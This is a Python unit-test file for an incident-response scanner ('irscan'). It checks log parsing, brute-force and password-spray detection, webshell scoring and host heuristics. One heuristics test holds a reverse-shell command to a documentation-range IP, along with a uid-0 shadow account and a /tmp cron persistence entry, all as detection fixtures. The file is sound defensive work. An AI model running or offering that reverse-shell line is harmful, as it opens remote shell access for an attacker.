"""日志解析、爆破判定与 webshell 评分的单元测试。"""

from __future__ import annotations

import os
import sys
import unittest
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from irscan.core.engine import AuthEvent, ScanConfig, ScanContext  # noqa: E402
from irscan.core.models import (  # noqa: E402
    AccountInfo, HostSnapshot, ProcessInfo, ScanResult, Severity, StartupItem,
)
from irscan.core import rules  # noqa: E402
from irscan.core.utils import parse_clf_time, parse_syslog_time  # noqa: E402
from irscan.detectors import bruteforce, heuristics, weblog, webshell  # noqa: E402
from irscan.parsers.logs import parse_line  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SAMPLES = os.path.join(ROOT, "samples")


def make_ctx(
    events: list[AuthEvent] | None = None,
    config: ScanConfig | None = None,
    weblog_lines: list[str] | None = None,
) -> ScanContext:
    cfg = config or ScanConfig(live=False)
    snap = HostSnapshot(platform="test")
    result = ScanResult(snapshot=snap)
    ctx = ScanContext(config=cfg, snapshot=snap, result=result)
    ctx.auth_events = events or []
    ctx.weblog_lines = weblog_lines or []
    return ctx


def ev(minute_offset: int, success: bool, ip: str, user: str = "root",
       base: datetime | None = None) -> AuthEvent:
    base = base or datetime(2024, 1, 15, 9, 0, 0)
    return AuthEvent(
        timestamp=base + timedelta(seconds=minute_offset),
        success=success, username=user, source_ip=ip,
        raw=f"{'Accepted' if success else 'Failed'} password for {user} from {ip}",
    )


class TestTimeParsing(unittest.TestCase):
    def test_syslog(self):
        now = datetime(2024, 1, 16, 12, 0, 0)
        self.assertEqual(parse_syslog_time("Jan 15 09:02:11", now),
                         datetime(2024, 1, 15, 9, 2, 11))

    def test_syslog_crosses_year(self):
        """12 月的日志在 1 月解析时应被判定为上一年，不能变成未来时间。"""
        now = datetime(2024, 1, 5, 12, 0, 0)
        got = parse_syslog_time("Dec 28 09:02:11", now)
        self.assertIsNotNone(got)
        self.assertEqual(got.year, 2023)

    def test_clf(self):
        self.assertEqual(parse_clf_time("15/Jan/2024:09:05:11 +0800"),
                         datetime(2024, 1, 15, 9, 5, 11))

    def test_syslog_with_year(self):
        """rsyslog 的带年份写法直接取年份，不能按 now 推断。"""
        got = parse_syslog_time("2024-01-15T03:12:04.123456+08:00 host sshd[1]: x")
        self.assertEqual(got, datetime(2024, 1, 15, 3, 12, 4))


class TestAuthParsing(unittest.TestCase):
    def test_failed_password(self):
        line = "Jan 15 09:02:11 host sshd[131]: Failed password for root from 203.0.113.77 port 41222 ssh2"
        e = parse_line(line, "t")
        self.assertIsNotNone(e)
        self.assertFalse(e.success)
        self.assertEqual(e.username, "root")
        self.assertEqual(e.source_ip, "203.0.113.77")

    def test_invalid_user(self):
        line = "Jan 15 09:02:49 host sshd[138]: Failed password for invalid user backup from 192.0.2.4 port 1 ssh2"
        e = parse_line(line, "t")
        self.assertEqual(e.username, "backup")

    def test_ipv4_mapped_normalized(self):
        """::ffff:192.0.2.4 必须归一成 192.0.2.4，否则同一 IP 会被拆成两个来源。"""
        line = "Jan 15 09:02:11 host sshd[1]: Failed password for root from ::ffff:203.0.113.77 port 1 ssh2"
        self.assertEqual(parse_line(line, "t").source_ip, "203.0.113.77")

    def test_accepted(self):
        line = "Jan 15 09:33:41 host sshd[132]: Accepted password for root from 203.0.113.77 port 50122 ssh2"
        e = parse_line(line, "t")
        self.assertTrue(e.success)

    def test_pam_failure(self):
        line = ("Jan 15 14:22:07 host sshd[140]: pam_unix(sshd:auth): authentication failure; "
                "logname= uid=0 euid=0 tty=ssh ruser= rhost=10.20.30.99 user=opsadmin")
        e = parse_line(line, "t")
        self.assertIsNotNone(e)
        self.assertFalse(e.success)
        self.assertEqual(e.username, "opsadmin")
        self.assertEqual(e.source_ip, "10.20.30.99")


class TestBruteforce(unittest.TestCase):
    def test_below_threshold_no_findings(self):
        events = [ev(i, False, "192.0.2.4") for i in range(4)]
        self.assertEqual(bruteforce.detect(make_ctx(events)), [])

    def test_at_threshold_detected(self):
        events = [ev(i, False, "203.0.113.9") for i in range(6)]
        findings = bruteforce.detect(make_ctx(events))
        self.assertTrue(findings)
        self.assertEqual(findings[0].severity, Severity.HIGH)
        self.assertIn("203.0.113.9", findings[0].title)

    def test_sliding_window_not_fixed_window(self):
        """跨"整分钟"边界的爆破不能被切成两段而漏报。"""

        events = [ev(59 + i, False, "203.0.113.9") for i in range(5)]
        findings = bruteforce.detect(make_ctx(events))
        self.assertTrue(findings, "滑动窗口应能检出跨分钟边界的爆破")

    def test_bruteforce_success_is_critical(self):
        events = [ev(i, False, "203.0.113.9") for i in range(8)]
        events.append(ev(60, True, "203.0.113.9"))
        findings = bruteforce.detect(make_ctx(events))
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, Severity.CRITICAL)
        self.assertIn("爆破成功", findings[0].title)

    def test_success_elsewhere_not_linked(self):
        """失败之前发生的成功登录不应被算作爆破成果。"""
        events = [ev(60, False, "203.0.113.9") for _ in range(6)]
        events.insert(0, ev(0, True, "203.0.113.9"))
        findings = bruteforce.detect(make_ctx(events))

        self.assertFalse(any("爆破成功" in f.title for f in findings))

    def test_password_spray(self):
        events = []
        for i, user in enumerate([f"u{i}" for i in range(8)]):
            events.append(ev(i * 2, False, "203.0.113.9", user=user))
        findings = bruteforce.detect(make_ctx(events))
        self.assertTrue(any(f.category == "密码喷洒" for f in findings))


class TestWebshell(unittest.TestCase):
    @staticmethod
    def _score(content: str) -> int:
        return sum(h.score for h in rules.load().scan("file", content))

    def test_high_score_on_shell(self):
        path = os.path.join(SAMPLES, "wwwroot", "uploads", "img_20240115.php")
        if not os.path.exists(path):
            self.skipTest("样本缺失")
        with open(path, encoding="utf-8") as fh:
            score = self._score(fh.read())
        self.assertGreaterEqual(score, rules.load().scoring.get("high", 6))

    def test_legit_file_not_flagged_high(self):
        """含 system() 的业务文件不判高危。"""
        path = os.path.join(SAMPLES, "wwwroot", "includes", "legacy_helper.php")
        if not os.path.exists(path):
            self.skipTest("样本缺失")
        with open(path, encoding="utf-8") as fh:
            score = self._score(fh.read())
        self.assertLess(score, rules.load().scoring.get("high", 6))

    def test_clean_file_no_hits(self):
        path = os.path.join(SAMPLES, "wwwroot", "index.php")
        if not os.path.exists(path):
            self.skipTest("样本缺失")
        with open(path, encoding="utf-8") as fh:
            self.assertEqual(rules.load().scan("file", fh.read()), [])

    def test_detect_runs_on_sample_dir(self):
        root = os.path.join(SAMPLES, "wwwroot")
        if not os.path.isdir(root):
            self.skipTest("样本缺失")
        ctx = make_ctx(config=ScanConfig(live=False, webroots=[root]))
        findings = webshell.detect(ctx)
        self.assertTrue(findings)
        self.assertTrue(any(f.severity == Severity.HIGH for f in findings))


class TestWebLog(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(SAMPLES, "access.log")
        cls.lines = []
        if os.path.exists(path):
            with open(path, encoding="utf-8") as fh:
                cls.lines = fh.read().splitlines()

    def test_sqlmap_ip_flagged(self):
        if not self.lines:
            self.skipTest("样本缺失")
        findings = weblog.detect(make_ctx(weblog_lines=self.lines))
        self.assertTrue(any("203.0.113.77" in f.title for f in findings))

    def test_sensitive_file_200_is_high(self):
        if not self.lines:
            self.skipTest("样本缺失")
        findings = weblog.detect(make_ctx(weblog_lines=self.lines))
        env = [f for f in findings if "192.0.2.55" in f.title]
        self.assertTrue(env, ".env 被成功访问的 IP 应被检出")
        self.assertEqual(env[0].severity, Severity.HIGH)

    def test_normal_traffic_not_flagged(self):
        """正常业务 IP 不应出现在结论里。"""
        if not self.lines:
            self.skipTest("样本缺失")
        findings = weblog.detect(make_ctx(weblog_lines=self.lines))
        self.assertFalse(any("10.20.30.5" in f.title for f in findings))


class TestHeuristics(unittest.TestCase):
    def test_reverse_shell_detected(self):
        snap = HostSnapshot(platform="linux")
        snap.processes = [ProcessInfo(pid=900, name="bash", ppid=1,
                                      cmdline="bash -i >& /dev/tcp/203.0.113.99/4444 0>&1")]
        ctx = make_ctx()
        ctx.snapshot = snap
        findings = heuristics.detect(ctx)
        self.assertTrue(any(f.category == "可疑进程" for f in findings))

    def test_shadow_root_detected(self):
        snap = HostSnapshot(platform="linux")
        snap.accounts = [AccountInfo(username="nginx", uid="0", shell="/bin/bash")]
        ctx = make_ctx()
        ctx.snapshot = snap
        findings = heuristics.detect(ctx)
        self.assertTrue(any("影子 root" in f.title for f in findings))

    def test_temp_dir_persistence_detected(self):
        snap = HostSnapshot(platform="linux")
        snap.startup = [StartupItem(source="cron", name="/etc/cron.d/x",
                                    command="*/5 * * * * root /tmp/.x/upd")]
        ctx = make_ctx()
        ctx.snapshot = snap
        findings = heuristics.detect(ctx)
        self.assertTrue(any(f.category == "持久化" for f in findings))

    def test_clean_host_no_findings(self):
        snap = HostSnapshot(platform="linux")
        snap.processes = [ProcessInfo(pid=1, name="systemd", ppid=0, exe="/usr/lib/systemd/systemd")]
        snap.accounts = [AccountInfo(username="root", uid="0", shell="/bin/bash"),
                         AccountInfo(username="daemon", uid="1", shell="/usr/sbin/nologin", enabled=False)]
        ctx = make_ctx()
        ctx.snapshot = snap
        self.assertEqual(heuristics.detect(ctx), [])


class TestEndToEnd(unittest.TestCase):
    def test_offline_scan_on_samples(self):
        auth = os.path.join(SAMPLES, "auth.log")
        web = os.path.join(SAMPLES, "access.log")
        root = os.path.join(SAMPLES, "wwwroot")
        if not (os.path.exists(auth) and os.path.exists(web)):
            self.skipTest("样本缺失")

        cfg = ScanConfig(live=False, auth_logs=[auth], web_logs=[web], webroots=[root])
        from irscan.cli import build_default_scanner
        scanner = build_default_scanner(cfg)
        result = scanner.run()
        self.assertTrue(result.findings)

        self.assertTrue(any(f.severity == Severity.CRITICAL for f in result.findings))

if __name__ == "__main__":
    unittest.main(verbosity=2)
